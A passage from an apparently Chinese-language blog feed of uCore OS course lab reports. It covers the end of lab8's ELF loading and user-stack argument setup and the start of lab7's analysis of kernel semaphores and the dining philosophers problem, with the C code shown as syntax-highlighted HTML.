== <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_mm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (setup_pgdir(mm) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_pgdir_cleanup_mm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> __<span class="title">elf</span>, *<span class="title">elf</span> = &amp;__<span class="title">elf</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="keyword">sizeof</span>(struct elfhdr), <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">        ret = -E_INVAL_ELF;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> __<span class="title">ph</span>, *<span class="title">ph</span> = &amp;__<span class="title">ph</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags, perm;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; elf-&gt;e_phnum; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="keyword">sizeof</span>(struct proghdr), elf-&gt;e_phoff + <span class="keyword">sizeof</span>(struct proghdr) * i)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;</span><br><span class="line">            ret = -E_INVAL_ELF;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        vm_flags = <span class="number">0</span>, perm = PTE_U;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;</span><br><span class="line">        <span class="keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;</span><br><span class="line">        <span class="keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">off_t</span> offset = ph-&gt;p_offset;</span><br><span class="line">        <span class="keyword">size_t</span> off, <span class="built_in">size</span>;</span><br><span class="line">        <span class="keyword">uintptr_t</span> start = ph-&gt;p_va, <span class="built_in">end</span>, la = ROUNDDOWN(start, PGSIZE);</span><br><span class="line"></span><br><span class="line">        ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">end</span> = ph-&gt;p_va + ph-&gt;p_filesz;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt; <span class="built_in">end</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, <span class="built_in">size</span> = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">end</span> &lt; la) &#123;</span><br><span class="line">                <span class="built_in">size</span> -= la - <span class="built_in">end</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, <span class="built_in">size</span>, offset)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            start += <span class="built_in">size</span>, offset += <span class="built_in">size</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">end</span> = ph-&gt;p_va + ph-&gt;p_memsz;</span><br><span class="line">        <span class="keyword">if</span> (start &lt; la) &#123;</span><br><span class="line">            <span class="keyword">if</span> (start == <span class="built_in">end</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start + PGSIZE - la, <span class="built_in">size</span> = PGSIZE - off;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">end</span> &lt; la) &#123;</span><br><span class="line">                <span class="built_in">size</span> -= la - <span class="built_in">end</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, <span class="built_in">size</span>);</span><br><span class="line">            start += <span class="built_in">size</span>;</span><br><span class="line">            assert((<span class="built_in">end</span> &lt; la &amp;&amp; start == <span class="built_in">end</span>) || (<span class="built_in">end</span> &gt;= la &amp;&amp; start == la));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; <span class="built_in">end</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, <span class="built_in">size</span> = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">end</span> &lt; la) &#123;</span><br><span class="line">                <span class="built_in">size</span> -= la - <span class="built_in">end</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, <span class="built_in">size</span>);</span><br><span class="line">            start += <span class="built_in">size</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    vm_flags = VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">    <span class="keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-2</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-3</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-4</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    mm_count_inc(mm);</span><br><span class="line">    current-&gt;mm = mm;</span><br><span class="line">    current-&gt;cr3 = PADDR(mm-&gt;pgdir);</span><br><span class="line">    lcr3(PADDR(mm-&gt;pgdir));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先算出所有参数加起来的长度</span></span><br><span class="line">    <span class="keyword">uint32_t</span> total_len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; ++i) &#123;</span><br><span class="line">        total_len += strnlen(kargv[i], EXEC_MAX_ARG_LEN) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 用户栈顶 减去所有参数加起来的长度 再 4字节对齐 找到 真正存放字符串参数的栈的位置</span></span><br><span class="line">    <span class="keyword">char</span> *arg_str = (USTACKTOP - total_len) &amp; <span class="number">0xfffffffc</span>;</span><br><span class="line">    <span class="comment">// 放字符串参数的栈的位置的下面 是存放指向字符串参数的指针</span></span><br><span class="line">    <span class="keyword">int32_t</span> *arg_ptr = (<span class="keyword">int32_t</span> *)arg_str - argc;</span><br><span class="line">    <span class="comment">// 指向字符串参数的指针下面 是参数的个数</span></span><br><span class="line">    <span class="keyword">int32_t</span> *stacktop = arg_ptr - <span class="number">1</span>;</span><br><span class="line">    *stacktop = argc;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> arg_len = strnlen(kargv[i], EXEC_MAX_ARG_LEN);</span><br><span class="line">        <span class="built_in">strncpy</span>(arg_str, kargv[i], arg_len);</span><br><span class="line">        *arg_ptr = arg_str;</span><br><span class="line">        arg_str += arg_len + <span class="number">1</span>;</span><br><span class="line">        ++arg_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> = <span class="title">current</span>-&gt;<span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line"></span><br><span class="line">    tf-&gt;tf_cs = USER_CS;</span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">    tf-&gt;tf_esp = stacktop;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags |= FL_IF;</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_cleanup_mmap:</span><br><span class="line">    exit_mmap(mm);</span><br><span class="line">bad_elf_cleanup_pgdir:</span><br><span class="line">    put_pgdir(mm);</span><br><span class="line">bad_pgdir_cleanup_mm:</span><br><span class="line">    mm_destroy(mm);</span><br><span class="line">bad_mm:</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>make qemu</p>
<p><img src="/images/loading.gif" data-original="/posts/7a4984ba/image-20200530215449273.png" alt="image-20200530215449273"></p>
<p>有下列可执行程序</p>
<p><img src="/images/loading.gif" data-original="/posts/7a4984ba/image-20200530215613204.png" alt="image-20200530215613204"></p>
<p>使用ls</p>
<p><img src="/images/loading.gif" data-original="/posts/7a4984ba/image-20200530215531814.png" alt="image-20200530215531814"></p>
<p>运行hello</p>
<p><img src="/images/loading.gif" data-original="/posts/7a4984ba/image-20200530215639564.png" alt="image-20200530215639564"></p>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>此次实验要实现一个可调用的文件系统，其实就是一个可执行的shell，该实验很难，非常难做。。。</p>
<p>至此ucoreOS实验到此结束。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>uCoreOs lab7 实验报告</title>
    <url>/posts/2cdd304c/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>理解操作系统的同步互斥的设计实现；</li>
<li>理解底层支撑技术：禁用中断、定时器、等待队列；</li>
<li>在ucore中理解信号量（semaphore）机制的具体实现；</li>
<li>理解管程机制，在ucore内核中增加基于管程（monitor）的条件变量（condition variable）的支持；</li>
<li>了解经典进程同步问题，并能使用同步机制解决进程同步问题。<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1/2/3/4/5/6。请把你做的实验1/2/3/4/5/6的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”/“LAB5”/“LAB6”的注释相应部分。并确保编译通过。注意：为了能够正确执行lab7的测试应用程序，可能需对已完成的实验1/2/3/4/5/6的代码进行进一步改进。</p>
<p>要修改的文件有<code>proc.c default_pmm.c pmm.c swap_fifo.c vmm.c trap.c kdebug.c</code></p>
<p>并将lab6的<code>default_sched_stride.c</code>复制到lab7，并对<code>default_sched.h sched.c</code>做修改</p>
<p>无需要在原代码基础上做进一步修改的代码</p>
<p>其中有个比较坑的地方需要做修改</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200503004711323.png" alt="image-20200503004711323"></p>
<p>此处需要和lab6一样改为MAX_TIME_SLICE</p>
<p>而且，比较奇怪的是，这个MAX_TIME_SLICE的值有时候能通过priority测验，有时候却不行，如果不行的话，可以将<code>sched.h</code>的MAX_TIME_SLICE的值进行调节（例如把20改成5）看是否能通过测验。</p>
<p>修改后执行make grade</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200503010426035.png" alt="image-20200503010426035"></p>
<p>测试均通过</p>
<h2 id="练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题"><a href="#练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题" class="headerlink" title="练习1: 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题"></a>练习1: 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</h2><p>完成练习0后，建议大家比较一下（可用meld等文件diff比较软件）个人完成的lab6和练习0完成后的刚修改的lab7之间的区别，分析了解lab7采用信号量的执行过程。执行<code>make grade</code>，大部分测试用例应该通过。</p>
<p>请在实验报告中给出内核级信号量的设计描述，并说明其大致执行流程。</p>
<p>请在实验报告中给出给用户态进程/线程提供信号量机制的设计方案，并比较说明给内核级提供信号量机制的异同。</p>
<blockquote>
<p>请在实验报告中给出内核级信号量的设计描述，并说明其大致执行流程。</p>
</blockquote>
<p>本次实验的底层支撑</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200529202921738.png" alt="image-20200529202921738"></p>
<p>信号量原理</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200529204139949.png" alt="image-20200529204139949"></p>
<p>信号量结构体包括信号量计数值sem和等待队列q</p>
<p>查看sem.c的头文件</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200529210822749.png" alt="image-20200529210822749"></p>
<p>查看文件kern/process/proc.c</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200529212022984.png" alt="image-20200529212022984"></p>
<p>可以看到在进程中，调用check_sync这个函数来解决哲学家问题</p>
<p>分析check_sync函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">kern/sync/check_sync.c  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_sync</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//check semaphore</span></span><br><span class="line">    sem_init(&amp;mutex, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;   <span class="comment">//N是哲学家的数量  </span></span><br><span class="line">        sem_init(&amp;s[i], <span class="number">0</span>);  <span class="comment">//初始化信号量 </span></span><br><span class="line">        <span class="comment">//线程需要执行的函数名、哲学家编号、0表示共享内存  </span></span><br><span class="line">        <span class="keyword">int</span> pid = kernel_thread(philosopher_using_semaphore, (<span class="keyword">void</span> *)i, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//创建哲学家就餐问题的内核线程 </span></span><br><span class="line">        <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;   <span class="comment">//创建失败的报错  </span></span><br><span class="line">            panic(<span class="string">"create No.%d philosopher_using_semaphore failed.\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        philosopher_proc_sema[i] = find_proc(pid);</span><br><span class="line">        set_proc_name(philosopher_proc_sema[i], <span class="string">"philosopher_sema_proc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//check condition variable</span></span><br><span class="line">    monitor_init(&amp;mt, N);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        state_condvar[i]=THINKING;</span><br><span class="line">        <span class="keyword">int</span> pid = kernel_thread(philosopher_using_condvar, (<span class="keyword">void</span> *)i, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            panic(<span class="string">"create No.%d philosopher_using_condvar failed.\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        philosopher_proc_condvar[i] = find_proc(pid);</span><br><span class="line">        set_proc_name(philosopher_proc_condvar[i], <span class="string">"philosopher_condvar_proc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>前半段是用信号量的方法，后半段是用管程的方法</p>
<p>pid用kernel_thread创建了一个内核线程，</p>
<p>其定义在kern/process/proc.c</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200530005812305.png" alt="image-20200530005812305"></p>
<p>其中fn表示内核线程执行的函数，arg表示传入的哲学家编号i，clone_flag表示共享内存的标志位</p>
<p>此处传入的函数为<code>philosopher_using_semaphore</code>，查看这个函数定义</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">kern/sync/check_sync.c</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">philosopher_using_semaphore</span><span class="params">(<span class="keyword">void</span> * arg)</span> <span class="comment">/* i：哲学家号码，从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, iter=<span class="number">0</span>;</span><br><span class="line">    i=(<span class="keyword">int</span>)arg;</span><br><span class="line">    cprintf(<span class="string">"I am No.%d philosopher_sema\n"</span>,i);</span><br><span class="line">    <span class="keyword">while</span>(iter++&lt;TIMES)</span><br><span class="line">    &#123; <span class="comment">/* 无限循环 */</span></span><br><span class="line">        cprintf(<span class="string">"Iter %d, No.%d philosopher_sema is thinking\n"</span>,iter,i); <span class="comment">/* 哲学家正在思考 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_take_forks_sema(i);</span><br><span class="line">        <span class="comment">/* 需要两只叉子，或者阻塞 */</span></span><br><span class="line">        cprintf(<span class="string">"Iter %d, No.%d philosopher_sema is eating\n"</span>,iter,i); <span class="comment">/* 进餐 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_put_forks_sema(i);</span><br><span class="line">        <span class="comment">/* 把两把叉子同时放回桌子 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">"No.%d philosopher_sema quit\n"</span>,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>传入参数*arg是哲学家的编号。</p>
<p>iter++&lt;TIMES，表示循环4次，目的在于模拟多次试验情况。</p>
<p>其中用do_sleep这个延时函数来模拟哲学家的思考和进餐的过程，且睡眠过程是无法打断的。</p>
<p>另外还有phi_take_forks_sema(i)和phi_put_forks_sema(i)这两个函数，表示拿起叉子和放下叉子。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5 <span class="comment">/* 哲学家数目 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT (i-1+N)%N <span class="comment">/* i的左邻号码 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT (i+1)%N <span class="comment">/* i的右邻号码 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THINKING 0 <span class="comment">/* 哲学家正在思考 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HUNGRY 1 <span class="comment">/* 哲学家想取得叉子 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EATING 2 <span class="comment">/* 哲学家正在吃面 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMES  4 <span class="comment">/* 吃4次饭 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLEEP_TIME 10</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_sema</span><span class="params">(i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//检查左右两位是否在eating，如果均不在吃，可获得EATING状态</span></span><br><span class="line">    <span class="keyword">if</span>(state_sema[i]==HUNGRY&amp;&amp;state_sema[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_sema[RIGHT]!=EATING)</span><br><span class="line">    &#123;</span><br><span class="line">        state_sema[i]=EATING;</span><br><span class="line">        up(&amp;s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=HUNGRY; <span class="comment">/* 记录下哲学家i饥饿的事实 */</span></span><br><span class="line">        phi_test_sema(i); <span class="comment">/* 试图得到两只叉子 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">        down(&amp;s[i]); <span class="comment">/* 如果得不到叉子就阻塞 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=THINKING; <span class="comment">/* 哲学家进餐结束 */</span></span><br><span class="line">        phi_test_sema(LEFT); <span class="comment">/* 看一下左邻居现在是否能进餐 */</span></span><br><span class="line">        phi_test_sema(RIGHT); <span class="comment">/* 看一下右邻居现在是否能进餐 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中mutex是二进制信号量结构体。</p>
<p>down代表P操作，up代表V操作</p>
<p>打开sem.c，sem.h，wait.h</p>
<p>有如下定义</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先是定义了一个信号量的数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value; <span class="comment">// 计数值 用于 PV操作</span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue; <span class="comment">// 进程等待队列</span></span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于等待队列 存放了当前等待的线程PCB 和 唤醒原因 和 等待队列 和 用于还原结构体的等待队列标志</span></span><br><span class="line"><span class="comment">/*wakeup_flags取值如下</span></span><br><span class="line"><span class="comment">kern/process/proc.h</span></span><br><span class="line"><span class="comment">#define WT_INTERRUPTED               0x80000000                    // the wait state could be interrupted</span></span><br><span class="line"><span class="comment">#define WT_CHILD                    (0x00000001 | WT_INTERRUPTED)  // wait child process</span></span><br><span class="line"><span class="comment">#define WT_KSEM                      0x00000100                    // wait kernel semaphore</span></span><br><span class="line"><span class="comment">#define WT_TIMER                    (0x00000002 | WT_INTERRUPTED)  // wait timer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span><span class="comment">//当前进程</span></span><br><span class="line">    <span class="keyword">uint32_t</span> wakeup_flags; <span class="comment">//唤醒标志</span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> *wait_queue; <span class="comment">//等待队列</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> wait_link; <span class="comment">//还原节点</span></span><br><span class="line">&#125; <span class="keyword">wait_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化信号量中的计数值和等待队列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sem_init</span><span class="params">(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    sem-&gt;value = value;</span><br><span class="line">    wait_queue_init(&amp;(sem-&gt;wait_queue));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    P操作 要关闭中断并保存 intr_flag 寄存器的值 避免共享变量被多个线程同时修改</span></span><br><span class="line"><span class="comment">    判断 计数值是否大于 0 </span></span><br><span class="line"><span class="comment">    	若大于 0 说明此时没有其他线程访问临界区 则直接将计数值 减 1 并 返回</span></span><br><span class="line"><span class="comment">    	若 计数值小于 0 则 已经有其他线程访问临界区了 就将当前线程放入等待队列中 并调用调度函数</span></span><br><span class="line"><span class="comment">    等到进程被唤醒 再将当前进程从等待队列中 取出并删去 最后判断等待的线程是因为什么原因被唤醒</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> __down(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">//********************原子操作 start**********************************</span></span><br><span class="line">    <span class="comment">//如果信号量大于0，那么说明信号量可用，因此可以分配给当前进程运行，分配完之后关闭中断 </span></span><br><span class="line">    <span class="keyword">if</span> (sem-&gt;value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sem-&gt;value --;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果信号量数值小于零，那么需要将当前进程加入等待队列并调用schedule函数查找下一个可以被运行调度的进程，</span></span><br><span class="line">    <span class="comment">//此时，如果能够查到，那么唤醒，并将其中队列中删除并返回 </span></span><br><span class="line">    <span class="keyword">wait_t</span> __wait, *wait = &amp;__wait;</span><br><span class="line">    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state);<span class="comment">//放入等待队列</span></span><br><span class="line">    <span class="comment">//********************原子操作end*************************************</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    schedule(); <span class="comment">//调度函数</span></span><br><span class="line"></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">//********************原子操作 start**********************************</span></span><br><span class="line">    wait_current_del(&amp;(sem-&gt;wait_queue), wait);<span class="comment">//将当前进程从等待队列删除</span></span><br><span class="line">    <span class="comment">//********************原子操作end*************************************</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;<span class="comment">//线程被唤醒，等待状态改变，返回新的等待状态</span></span><br><span class="line">        <span class="keyword">return</span> wait-&gt;wakeup_flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    V操作 也要关闭中断 并保存 intr_flag 寄存器的值 防止共享变量同时被多个线程访问或修改</span></span><br><span class="line"><span class="comment">    先判断等待队列是否为空 若为空 则将计数值 加 1 并返回</span></span><br><span class="line"><span class="comment">    若不为空 则说明还有线程在等待 此时取出等待队列的第一个线程 并将其 唤醒 唤醒的过程中 </span></span><br><span class="line"><span class="comment">    将其从等待队列中删除</span></span><br><span 